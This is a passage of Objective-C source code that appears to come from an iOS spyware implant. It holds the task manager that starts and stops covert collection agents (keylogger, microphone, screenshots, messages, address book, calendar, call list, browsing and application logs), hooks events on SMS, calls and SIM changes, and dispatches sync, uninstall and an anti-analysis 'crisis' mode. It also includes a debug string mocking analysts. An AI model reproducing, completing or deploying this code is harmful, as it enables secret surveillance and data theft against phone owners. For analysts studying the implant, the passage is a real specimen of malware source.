                [agentCommand release];
                break;
              }  
            case AGENT_APPLICATION:
              {
#ifdef DEBUG
                NSLog(@"%s: Starting Agent Application", __FUNCTION__);
#endif
                agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                shMemoryHeader->commandDataSize = 0;
                
                BOOL success = [_logManager createLog: LOG_APPLICATION
                                          agentHeader: nil
                                            withLogID: 0];
                
                if (success == TRUE)
                  {
                    if ([mSharedMemory writeMemory: agentCommand
                                            offset: OFFT_APPLICATION
                                     fromComponent: COMP_CORE])
                      {
#ifdef DEBUG
                        NSLog(@"%s: Command START sent to Agent Application", __FUNCTION__);
#endif
                        [anObject setObject: AGENT_RUNNING
                                     forKey: @"status"];
                      }
                  }
                else
                  {
#ifdef DEBUG
                    NSLog(@"%s: An error occurred while creating log for Agent Application", __FUNCTION__);
#endif
                  }
              
                [agentCommand release];
                
                break;
              }  
            case AGENT_MESSAGES:
              {
#ifdef DEBUG
                NSLog(@"Starting Agent Messages");
#endif
                RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
#ifdef DEBUG
                    NSLog(@"Config for Messages not found");
#endif
                    break;
                  }
                else
                  {
                    [anObject setObject: AGENT_START forKey: @"status"];
                    
                    agentMessages.mAgentConfiguration = anObject;
                    
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentMessages
                                           withObject: nil];
                  }
                  
                break;
              }
            case AGENT_ORGANIZER:
              {
                RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
                RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
#ifdef DEBUG_TMP
                NSLog(@"Starting Agent AddressBook %x and Calendar %x", agentAddress, agentCalendar);
#endif                
                [anObject setObject: AGENT_START forKey: @"status"];  
                
                agentAddress.mAgentConfiguration = anObject;
                agentCalendar.mAgentConfiguration = anObject;
                
                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentAddress
                                       withObject: nil];
                                           
                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentCalendar
                                       withObject: nil];
#ifdef DEBUG_TMP
                NSLog(@"Agent AddressBook and Calendar Started");
#endif
                  
                  
                break;
              }
            case AGENT_KEYLOG:
              {
#ifdef DEBUG
                NSLog(@"%s: Starting Agent Keylog", __FUNCTION__);
#endif
                
                agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                shMemoryHeader->commandDataSize = 0;
                
                BOOL success = [_logManager createLog: LOG_KEYLOG
                                          agentHeader: nil
                                            withLogID: 0];
                
                if (success == TRUE)
                  {
                    if ([mSharedMemory writeMemory: agentCommand
                                            offset: OFFT_KEYLOG
                                     fromComponent: COMP_CORE])
                      {
#ifdef DEBUG
                        NSLog(@"%s: Command START sent to Agent Keylog", __FUNCTION__);
#endif
                        [anObject setObject: AGENT_RUNNING
                                     forKey: @"status"];
                      }
                    else
                      {
#ifdef DEBUG
                        NSLog(@"Failed while sending START command to Agent Keylog");
#endif
                      }
                  }
                else
                  {
#ifdef DEBUG
                    NSLog(@"%s: Failed while creating LOG_URL log file", __FUNCTION__);
#endif
                  }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_CRISIS:
              {
#ifdef DEBUG
                NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
#endif
                gAgentCrisis = YES;

                RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
                [infoManager logActionWithDescription: @"Crisis started"];
                [infoManager release];
              
                break;
              }
            case AGENT_DEVICE:
              {
#ifdef DEBUG
                NSLog(@"Starting Agent Device");
#endif
                RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];

                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
#ifdef DEBUG
                    NSLog(@"Config for Device not found");
#endif
                    break;
                  }
                else
                  {
                    [anObject setObject: AGENT_START forKey: @"status"];
                    agentDevice->mAgentConfiguration = anObject;

                    [NSThread detachNewThreadSelector: @selector(start)
                      toTarget: agentDevice
                      withObject: nil];
                  }
                break;
              }
            case AGENT_CALL_LIST:
              {
#ifdef DEBUG
                NSLog(@"Starting Agent Call List");
#endif
                RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];
                agentCallList.mAgentConfiguration = anObject;

                [anObject setObject: AGENT_START forKey: @"status"];
                    
                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentCallList
                                       withObject: nil];
                break;
              }
            default:
              break;
            }
            
          if (agentConfiguration != nil)
            [agentConfiguration release];
        }
      
      [status release];
      [innerPool release];
    }
  
  [outerPool release];
  
  return YES;
}

- (BOOL)stopAgents
{
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  RCSILogManager *_logManager   = [RCSILogManager sharedInstance];
  
#ifdef DEBUG
  NSLog(@"Stop all Agents called");
#endif
  
  NSMutableDictionary *anObject;
  
  for (anObject in mAgentsList)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      int agentID = [[anObject objectForKey: @"agentID"] intValue];
      NSString *status = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
      
      if ([status isEqualToString: AGENT_RUNNING] == TRUE)
        {
          switch (agentID)
            {
            case AGENT_SCREENSHOT:
              {
#ifdef DEBUG        
                NSLog(@"Stopping Agent Screenshot");
#endif
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                shMemoryHeader->commandDataSize = 0;
                
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_SCREENSHOT
                                 fromComponent: COMP_CORE])
                  {
                    [anObject setObject: AGENT_STOP
                                 forKey: @"status"];
                  }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_MICROPHONE:
              {
#ifdef DEBUG        
                NSLog(@"Stopping Agent Microphone");
#endif
                RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
                
                if ([agentMicrophone stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent Microphone");
#endif
                  }
                else
                  {
                    [anObject setObject: AGENT_STOPPED
                                 forKey: @"status"];
                  }
                
                break;
              }
            case AGENT_URL:
              {
#ifdef DEBUG        
                NSLog(@"Stopping Agent URL");
#endif
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_URL
                                 fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG
                    NSLog(@"Stop command sent to Agent URL");
#endif

                    [_logManager closeActiveLog: LOG_URL withLogID: 0];
                    [anObject setObject: AGENT_STOP
                                 forKey: @"status"];
                  }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_APPLICATION:
              {
#ifdef DEBUG       
                NSLog(@"Stopping Agent Application");
#endif
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_APPLICATION
                                 fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG
                    NSLog(@"Stop command sent to Agent Application");
#endif
                
                    [_logManager closeActiveLog: LOG_APPLICATION withLogID: 0];
                    [anObject setObject: AGENT_STOP
                                 forKey: @"status"];
                  }
              
                [agentCommand release];
              
                break;
              }              
            case AGENT_MESSAGES:
              {
#ifdef DEBUG        
                NSLog(@"Stopping Agent Messages");
#endif
                RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
                
                if ([agentMessages stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent Messages");
#endif
                  }
                else
                  {
                    [anObject setObject: AGENT_STOP
                                 forKey: @"status"];
                  }
                
                break;
              }
            case AGENT_ORGANIZER:
              {
#ifdef DEBUG        
                NSLog(@"Stopping Agent AddressBook and Calendar");
#endif
                RCSIAgentAddressBook *agentAddress  = [RCSIAgentAddressBook sharedInstance];
                RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
                
                if ([agentAddress stop] == FALSE ||
                    [agentCalendar stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent AddressBook/Calendar");
#endif
                  }
                else
                  {
                    [anObject setObject: AGENT_STOP
                                 forKey: @"status"];
                  }
                
                break;
              }
            case AGENT_KEYLOG:
              {
#ifdef DEBUG        
                NSLog(@"Stopping Agent Keylog");
#endif
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([mSharedMemory writeMemory: agentCommand
                                        offset: OFFT_KEYLOG
                                 fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG
                    NSLog(@"Stop command sent to Agent Keylog");
#endif

                    [_logManager closeActiveLog: LOG_KEYLOG withLogID: 0];
                    [anObject setObject: AGENT_STOP
                                 forKey: @"status"];
                  }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_CRISIS:
              {
#ifdef DEBUG
                NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
#endif
                gAgentCrisis = NO;

                RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
                [infoManager logActionWithDescription: @"Crisis stopped"];
                [infoManager release];
              
                break;
              }
            case AGENT_DEVICE:
              {
#ifdef DEBUG        
                NSLog(@"Stopping Agent Device");
#endif
                RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];

                if ([agentDevice stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent Device");
#endif
                  }
                else
                  {
                    [anObject setObject: AGENT_STOPPED
                                 forKey: @"status"];
                  }

                break;
              }
            case AGENT_CALL_LIST:
              {
#ifdef DEBUG        
                NSLog(@"Stopping Agent Call List");
#endif
                RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];

                if ([agentCallList stop] == FALSE)
                  {
#ifdef DEBUG
                    NSLog(@"Error while stopping agent Call List");
#endif
                  }
                else
                  {
                    [anObject setObject: AGENT_STOPPED
                                 forKey: @"status"];
                  }

                break;
              }
            default:
              {
                break;
              }
            }
        }
      
      [status release];
      [innerPool release];
      
      usleep(50000);
    }
  
  [outerPool release];
  
  return YES;
}

#pragma mark -
#pragma mark Monitors
#pragma mark -

- (void)eventsMonitor
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG
  NSLog(@"eventsMonitor called, starting all the thread monitors");
#endif
  NSEnumerator *enumerator = [mEventsList objectEnumerator];
  id anObject;
  
  while ((anObject = [enumerator nextObject]))
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      switch ([[anObject threadSafeObjectForKey: @"type"
                                      usingLock: gTaskManagerLock] intValue])
        {
        case EVENT_TIMER:
          {
#ifdef DEBUG
            NSLog(@"EVENT TIMER FOUND! Starting monitor Thread");
#endif
            RCSIEvents *events = [RCSIEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventTimer:)
                                     toTarget: events
                                   withObject: anObject];
            /*
            sleep(3);
            [anObject setValue: EVENT_STOP forKey: @"status"];
            
            while ([anObject objectForKey: @"status"] != EVENT_STOPPED)
              {
                NSLog(@"Waiting for thread to stop");
                sleep(1);
              }
            NSLog(@"STOPPED");
            exit(-1);
            */
            break;
          }
        case EVENT_PROCESS:
          {
#ifdef DEBUG
            NSLog(@"EVENT Process FOUND! Starting monitor Thread");
#endif
            RCSIEvents *events = [RCSIEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventProcess:)
                                     toTarget: events
                                   withObject: anObject];
            break;
          }
        case EVENT_CONNECTION:
          {
#ifdef DEBUG
            NSLog(@"EVENT Connection FOUND! Starting monitor Thread");
#endif
            RCSIEvents *events = [RCSIEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventConnection:)
                                     toTarget: events
                                   withObject: anObject];
           break; 
          }
        case EVENT_QUOTA:
          break;
        case EVENT_BATTERY:
          {
#ifdef DEBUG
            NSLog(@"EVENT battery FOUND! add object");
#endif
            RCSIEvents *events = [RCSIEvents sharedEvents];
            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
            [center addNotificationObject: (id) events withEvent: BATTERY_CT_EVENT];
            break;
          }
        case EVENT_SMS:
          {
            RCSIEvents *events = [RCSIEvents sharedEvents];
            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
            [center addNotificationObject: (id) events withEvent: SMS_CT_EVENT];
            break;
          }
        case EVENT_CALL:
          {
            RCSIEvents *events = [RCSIEvents sharedEvents];
            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
            [center addNotificationObject: (id) events withEvent: CALL_CT_EVENT];
            break;
          }
        case EVENT_SIM_CHANGE:
          {
            RCSIEvents *events = [RCSIEvents sharedEvents];
            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
            [center addNotificationObject: (id) events withEvent: SIM_CT_EVENT];
            break;
          }
        case EVENT_STANDBY:
          {
            RCSIEvents *events = [RCSIEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventStandBy:)
                                     toTarget: events
                                   withObject: anObject];
            break;
          }
        default:
          {
#ifdef DEBUG
            NSLog(@"Event not implemented, consider going to fuck yourself ANALyst");
#endif
            break;
          }
        }
      
      [innerPool release];
    }
  
  [outerPool release];
}

- (BOOL)stopEvents
{
  id anObject;
  
  int counter   = 0;
  int errorFlag = 0;
  
  for (anObject in mEventsList)
    {
      [anObject setValue: EVENT_STOP forKey: @"status"];
    
      switch ([[anObject threadSafeObjectForKey: @"type"
                                      usingLock: gTaskManagerLock] intValue])
        {
          case EVENT_BATTERY:
          {
            RCSIEvents *events = [RCSIEvents sharedEvents];
            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
            [center removeNotificationObject: (id) events withEvent: BATTERY_CT_EVENT];
            [anObject setValue: EVENT_STOPPED forKey: @"status"];
            break;
          }
          case EVENT_SMS:
          {
            RCSIEvents *events = [RCSIEvents sharedEvents];
            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
            [center removeNotificationObject: (id) events withEvent: SMS_CT_EVENT];
            [anObject setValue: EVENT_STOPPED forKey: @"status"];
            break;
          }
          case EVENT_CALL:
          {
            RCSIEvents *events = [RCSIEvents sharedEvents];
            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
            [center removeNotificationObject: (id) events withEvent: CALL_CT_EVENT];
            [anObject setValue: EVENT_STOPPED forKey: @"status"];
            break;
          }
          case EVENT_CONNECTION:
          {
            break;
          }
          case EVENT_SIM_CHANGE:
          {
            RCSIEvents *events = [RCSIEvents sharedEvents];
            RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
            [center removeNotificationObject: (id) events withEvent: SIM_CT_EVENT];
            [anObject setValue: EVENT_STOPPED forKey: @"status"];
            break;
          }
          case EVENT_STANDBY:
          {
            // 
            NSMutableData *standByCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[standByCommand bytes];
            shMemoryHeader->agentID         = OFFT_STANDBY;
            shMemoryHeader->direction       = D_TO_AGENT;
            shMemoryHeader->command         = AG_STOP;
            shMemoryHeader->commandDataSize = 0;
            
            memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
            
#ifdef DEBUG
            NSLog(@"%s: sending standby command to dylib", __FUNCTION__);
#endif
            
            if ([mSharedMemoryCommand writeMemory: standByCommand
                                           offset: OFFT_STANDBY
                                    fromComponent: COMP_CORE])
            {
#ifdef DEBUG
              NSLog(@"%s: sending standby command to dylib: done!", __FUNCTION__);
#endif
            }
            else 
            {
#ifdef DEBUG
              NSLog(@"%s: sending standby command to dylib: error!", __FUNCTION__);
#endif
            }
            
            [standByCommand release]; 
            break;
          }
        }
    
      while ([anObject objectForKey: @"status"] != EVENT_STOPPED
             && counter <= MAX_WAIT_TIME)
        {
          sleep(1);
          counter++;
        }
      
      if (counter == MAX_WAIT_TIME)
        errorFlag = 1;
      
      counter = 0;
    }
  
  if (errorFlag == 0)
    return TRUE;
  else
    return FALSE;
}

#pragma mark -
#pragma mark Action Dispatcher
#pragma mark -

- (BOOL)triggerAction: (int)anActionID
{
#ifdef DEBUG
  NSLog(@"Triggering Action: %d", anActionID);
#endif
  
  NSMutableDictionary *configuration = [self getConfigForAction: anActionID];
  
#ifdef DEBUG_VERBOSE_1
  NSLog(@"conf: %@", configuration);
#endif

  switch ([[configuration objectForKey: @"type"] intValue])
    {
    case ACTION_SYNC:
      {
#ifdef DEBUG
        NSLog(@"Starting action Sync");
#endif
        
        if ([[configuration objectForKey: @"status"] intValue] == 0)
          {
            if (gAgentCrisis == NO) 
              {
#ifdef DEBUG
                NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
#endif
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];
            
                [mActions actionSync: configuration];
              }
            else 
              {
#ifdef DEBUG
                NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
#endif
              }
          }
        
        break;
      }
    case ACTION_AGENT_START:
      {
        // Maybe call directly startAgent form TaskManager here instead of passing
        // through RCSMActions
        
        if ([[configuration objectForKey: @"status"] intValue] == 0)
          {
#ifdef DEBUG
            NSLog(@"AGENT START");
#endif
            
            NSNumber *status = [NSNumber numberWithInt: 1];
            [configuration setObject: status forKey: @"status"];
            
            [mActions actionAgent: configuration start: TRUE];
          }
        
        break;
      }
    case ACTION_AGENT_STOP:
      {
        if ([[configuration objectForKey: @"status"] intValue] == 0)
          {
            NSNumber *status = [NSNumber numberWithInt: 1];
            [configuration setObject: status forKey: @"status"];
            
            [mActions actionAgent: configuration start: FALSE];
          }
        
        break;
      }
    case ACTION_UNINSTALL:
      {
        if ([[configuration objectForKey: @"status"] intValue] == 0)
          {
            NSNumber *status = [NSNumber numberWithInt: 1];
            [configuration setObject: status forKey: @"status"];
            
            [mActions actionUninstall: configuration];
          }
        
        break;
      }
    case ACTION_INFO:
      {
#ifdef DEBUG
        NSLog(@"Starting info action");
#endif
        if ([[configuration objectForKey: @"status"] intValue] == 0)
          {
            NSNumber *status = [NSNumber numberWithInt: 1];
            [configuration setObject: status forKey: @"status"];
            
            [mActions actionInfo: configuration];
            status = [NSNumber numberWithInt: 0];
            [configuration setObject: status forKey: @"status"];
          }
        
        break;
      }
    default:
      return FALSE;
    }
  
  return TRUE;
}

#pragma mark -
#pragma mark Registering functions for events/actions/agents
#pragma mark -

- (BOOL)registerEvent: (NSData *)eventData
                 type: (u_int)aType
               action: (u_int)actionID
{
#ifdef DEBUG_VERBOSE_1
  NSLog(@"Registering event type %d", aType);
#endif
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  NSNumber *type = [NSNumber numberWithUnsignedInt: aType];
  NSNumber *action = [NSNumber numberWithUnsignedInt: actionID];
  
  NSArray *keys;
  NSArray *objects;
  
  keys = [NSArray arrayWithObjects: @"type", @"actionID", @"data",
                                    @"status", @"monitor", nil];
  
  if (eventData == nil)
    {
      objects = [NSArray arrayWithObjects: type, action, @"",
                                           EVENT_START, @"", nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: type, action, eventData,
                                           EVENT_START, @"", nil];
    }
  
#ifdef DEBUG_VERBOSE_1
  NSLog(@"EventData: %@", eventData);
#endif
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [eventConfiguration addEntriesFromDictionary: dictionary];
  [mEventsList addObject: eventConfiguration];
  
  return YES;
}

- (BOOL)unregisterEvent: (u_int)eventID
{
  return YES;
}

- (BOOL)registerAction: (NSData *)actionData
                  type: (u_int)actionType
                action: (u_int)actionID
{
#ifdef DEBUG
  NSLog(@"Registering action ID (%d) with type (%d) content (%@)", actionID, actionType, actionData);
#endif
  NSMutableDictionary *actionConfiguration = [[NSMutableDictionary alloc] init];
  NSNumber *action = [NSNumber numberWithUnsignedInt: actionID];
  NSNumber *type = [NSNumber numberWithUnsignedInt: actionType];
  NSNumber *status = [NSNumber numberWithInt: 0];
  
  NSArray *keys;
  NSArray *objects;
  
  keys = [NSArray arrayWithObjects: @"actionID", @"type", @"data", @"status", nil];
  
  if (actionData == nil)
    {
      objects = [NSArray arrayWithObjects: action, type, @"", status, nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: action, type, actionData, status, nil];
    }
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [actionConfiguration addEntriesFromDictionary: dictionary];
  
  [mActionsList addObject: actionConfiguration];
  
  return YES;
}

- (BOOL)unregisterAction: (u_int)actionID
{
  return YES;
}

- (BOOL)registerAgent: (NSData *)agentData
              agentID: (u_int)agentID
               status: (u_int)status
{
#ifdef DEBUG_VERBOSE_1
  NSLog(@"Registering Agent ID (%x) with status (%@) and data:\n%@", agentID, 
        (status == 2 ) ? @"activated" : @"deactivated", agentData);
#endif
  
  NSMutableDictionary *agentConfiguration = [[NSMutableDictionary alloc] init];
  NSNumber *tempID = [NSNumber numberWithUnsignedInt: agentID];
  
  NSString *agentState = (status == 2) ? AGENT_ENABLED : AGENT_DISABLED;
  NSArray *keys;
  NSArray *objects;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  if (agentData == nil)
    {
      objects = [NSArray arrayWithObjects: tempID,
                                           agentState,
                                           @"",
                                           nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: tempID,
                                           agentState,
                                           agentData,
                                           nil];
    }
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [agentConfiguration addEntriesFromDictionary: dictionary];
  [mAgentsList addObject: agentConfiguration];
  
  return YES;  
}

- (BOOL)unregisterAgent: (u_int)agentID
{
  return YES;
}

- (BOOL)registerParameter: (NSData *)confData
{
#ifdef DEBUG_VERBOSE_1
  NSLog(@"Registering conf parameter x, cool");
#endif
  
  [mGlobalConfiguration addObject: confData];
  
  return TRUE;
}

- (BOOL)unregisterParameter: (NSData *)confData
{
  return TRUE;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)getConfigForAction: (u_int)anActionID
{
  NSMutableDictionary *anObject;
  
  for (anObject in mActionsList)
    {
      if ([[anObject threadSafeObjectForKey: @"actionID"
                                  usingLock: gTaskManagerLock]
           unsignedIntValue] == anActionID)
        {
#ifdef DEBUG
          NSLog(@"Action %d found", anActionID);
#endif
        
          return anObject;
        }
    }
  
#ifdef DEBUG_ERRORS
  NSLog(@"Action not found! %d", anActionID);
#endif
  
  return nil;
}

- (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
{
#ifdef DEBUG_VERBOSE_1
  NSLog(@"getConfigForAgent called %x", anAgentID);
#endif
  
  NSMutableDictionary *anObject;
  
  for (anObject in mAgentsList)
    {
      if ([[anObject threadSafeObjectForKey: @"agentID"
                                  usingLock: gTaskManagerLock]
           unsignedIntValue] == anAgentID)
        {
#ifdef DEBUG
          NSLog(@"Agent %d found", anAgentID);
#endif
          return anObject;
        }
    }
  
#ifdef DEBUG
  NSLog(@"Agent %d not found", anAgentID);
#endif
  
  return nil;
}

- (void)removeAllElements
{
  [mEventsList removeAllObjects];
  [mActionsList removeAllObjects];
  [mAgentsList removeAllObjects];
}

@end
